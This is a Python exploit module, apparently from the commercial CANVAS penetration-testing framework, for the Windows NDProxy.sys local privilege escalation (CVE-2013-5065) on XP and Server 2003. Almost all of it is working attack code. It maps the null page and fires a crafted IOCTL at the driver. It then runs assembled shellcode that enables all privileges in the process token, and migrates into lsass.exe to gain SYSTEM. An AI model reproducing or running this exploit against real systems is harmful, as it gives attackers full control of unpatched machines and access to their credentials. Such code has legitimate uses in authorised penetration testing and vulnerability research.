
#! /usr/bin/env python
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

#
# CANVAS Exploit
#

#covers both angles
import sys
if "." not in sys.path:
    sys.path.append(".")

import struct
from exploitutils import *
from canvasexploit import canvasexploit
from ExploitTypes.localexploit import LocalExploit
from shelllistener import *
from MOSDEF import mosdef
import canvasengine


NAME='NDProxy'
DESCRIPTION='Windows NDProxy.sys Local Privilege Escalation'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION['Date public']='11/28/2013'
DOCUMENTATION['CVE Name'] = 'CVE-2013-5065'
DOCUMENTATION['CVE Url'] = 'http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-5065'
DOCUMENTATION['CVSS'] = 7.2
DOCUMENTATION['References']='https://technet.microsoft.com/en-us/security/advisory/2914486'

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Local'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['XP','2003']
PROPERTY['MS PATCHES']=["KB2914368"]

NOTES="""
Tested on:
Windows XP Professional SP3 English
Windows 2003 Standard Edition SP2 English

Constraints:
In order to work inside the Acrobat Sandbox, the Routing and Remote Access (RRAS) service
must be running.

Usage:
Win32/MOSDEF$ runmodule ndproxy
"""

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name                   = NAME
        self.result                 = 0
        self.device_name             = "\\\\.\\NDProxy"
        self.ioctl_code             = 0x8fff23cc
        self.ioctl_buf_addr         = 0x0     
        self.ioctl_buf_len          = 0
        self.ioctl_buf              = ""
        self.minor_version          = 0
        self.major_version          = 0
        self.x64                    = 0
        
    def create_shellcode(self):
        token_address = self.node.shell.get_process_token_ring0_address()
        self.log("Process Ring0 Token Address: 0x%08x" % token_address)
        
        # offset to SePrivileges
        token_address = token_address + 0xA0
        
        asm = """
        push %ebx
        movl $0xTOKENADDRESS, %ebx
        mov $0x00000014, (%ebx)
        pop %ebx
        ret $0x8
        """
        
        asm = asm.replace("TOKENADDRESS", "%08x" % token_address)
        arch = 'x86'
            
        shellcode = mosdef.assemble(asm,arch)
        return shellcode
   
    def DefineDosDeviceA(self, deviceName, targetPath, flags=1):
	vars={}
	vars["deviceName"]=deviceName
	vars["targetPath"]=targetPath
	vars["flags"]=flags
        code="""
        #import "remote", "kernel32.dll|DefineDosDeviceA" as "DefineDosDeviceA"
        #import "local","sendint" as "sendint"

        #import "string", "deviceName" as "deviceName"
        #import "string", "targetPath" as "targetPath"
        #import "int", "flags" as "flags"

        void main() {
          int ret;
          ret=DefineDosDeviceA(flags, deviceName, targetPath);
          sendint(ret);
        }
        """     
        self.node.shell.clearfunctioncache()
        request=self.node.shell.compile(code,vars)
        self.node.shell.sendrequest(request)
        ret=self.node.shell.readint()
        self.node.shell.leave()            
        return ret
        
    def memcpy(self, dest, data):
        vars = {}
        vars["dest"] = dest

        code="""
        //start of code
        #import "local", "readintfromself" as "readintfromself"
        #import "local", "readdatafromself" as "readdatafromself"

        """
    
        code += """
        #import "int", "dest" as "dest"
        """
            
        code += """

        void main() 
        {  int size;

           size = readintfromself();
           readdatafromself(dest, size);
        }
        """
        self.node.shell.clearfunctioncache()
        request = self.node.shell.compile(code, vars)
        self.node.shell.sendrequest(request)

        self.node.shell.sendint(len(data))
        self.node.shell.writebuf(data)
                                
        self.node.shell.leave()

    # Test to make sure the driver is accessible
    def test(self):
        if self.node.nodetype == "win32Node":
            if self.node.shell.has_wow_64 and self.node.shell.is_wow_64:
                self.log('This module does not currently support WoW64. Aborting.')
                return 0
            self.log("Running on 32-bit.")
        else:
            self.log('This module does not support node type: %s' % self.node.nodetype)
            return 0
        
        # Check our Windows version is >= Vista
        ret, os_version = self.node.shell.GetVersionEx()
        
        if not ret:
            self.log("Failed to determine OS version. Exiting.")
            return 0
        else:
            if not os_version['Major Version'] == 5 and (os_version['Minor Version'] == 1 or os_version['Minor Version']==3):
                self.log("Exploit only supports Windows XP SP3 or Windows 2003 Server SP2")
                return 0
        
        self.major_version = os_version["Major Version"]
        self.minor_version = os_version["Minor Version"]
       
        # CreateFile* constants
        GENERIC_READ  = 0x80000000
        GENERIC_WRITE = 0x40000000
        OPEN_EXISTING = 0x3
	
        # This is for exploiting Windows 2003 
        self.DefineDosDeviceA("NDProxy", "\\Device\\NDProxy")
        
        self.h_driver_device = self.node.shell.CreateFile(self.device_name,0, 0, 0, OPEN_EXISTING, 0)
        
        if self.h_driver_device <= 0:
            self.log("Driver Not Available. Exiting. Handle: 0x%08x" % self.h_driver_device)
            return 0
        else:
            self.log("Driver Available.")
            self.log("Handle: 0x%08x" % self.h_driver_device)
            
        return 1

    def test_lsass_access(self):
        # test that we even need to use an exploit
        process_list = self.node.shell.processlist()
        
        for process in process_list:
            if process["exe"] == "lsass.exe":
                lsass_pid = process["pid"]
                self.log("Found LSASS.exe PID: %d" % lsass_pid)
                break
                
        # try to get a handle to lsass
        h_lsass = self.node.shell.openprocess(lsass_pid)
        
        if h_lsass:
            self.log("Handle opened to LSASS successfully!")
            ret = 1
        else:
            self.log("Not enough privileges to access LSASS.")
            ret = 0

        self.node.shell.CloseHandle(h_lsass)
        
        return ret

    def run_attack(self,node):
        self.node = node
        
        # test for the driver
        ret = self.test()

        if not ret:
            return ret            
        
        # allocate null page
        ret = node.shell.NtAllocateVirtualMemory(0x1)
        if ret != 0:
            self.log("Failed to allocate null page")
            return 0

        # zeroing NDProxy!TspCB    
        self.log("Firing IOCTL.")
        ret = self.node.shell.DeviceIoControlAddress(self.h_driver_device, 0x8FFF23C0, "\x00"*8, 4)
        self.log("IOCTL sent")            
            
        # build our privilege enabling shellcode
        shellcode = self.create_shellcode()
        shellcode = '\x90'*100 + shellcode
        self.memcpy(0x0, shellcode)
                    
        in_buffer = '\0'* 0x14
        in_buffer += struct.pack('<L',0x7030125)
        in_buffer += '\0' * (0x1c - len(in_buffer))
        in_buffer += struct.pack('<L',0x34)
        in_buffer += '\0' * (0x54 - len(in_buffer))        
        out_buffer = in_buffer            
            
        self.log("Firing IOCTL.")
        ret = self.node.shell.DeviceIoControlAddress(self.h_driver_device, self.ioctl_code, in_buffer,0x54)
        self.log("IOCTL sent")
        
        ret = self.test_lsass_access()
        
        if ret:            
            self.log("Successful privilege escalation! Migrating to lsass.exe now.")
            
            migrate = self.engine.getModuleExploit("mosdefmigrate")
            migrate.link(self)
            migrate.argsDict['pid'] = 'lsass.exe'
            ret = migrate.run()
            
            if not ret:
                self.log("Couldn't migrate, aborting..")
                ret = 0
            else:
                self.log("Exploit succeeded. Now living in lsass.exe")
                ret = 1

        else:
            # failed to get a handle to lsass.exe our exploit failed
            ret = 0    
        
        return ret

    def run(self):
        self.setInfo('%s (in progress)'%(NAME))
        success=0 
        for node in self.argsDict['passednodes']:
            if 'win32api' not in node.capabilities:
                self.log('Node %s not a Win32 node'%(node.getname()))
                continue
            ret=self.run_attack(node)
            if ret==1:
                self.log("Successfully migrated to LSASS. We are now SYSTEM.")
                success=1
        return success

if __name__=='__main__':
    print 'This Windows local module is meant to be run only within CANVAS'
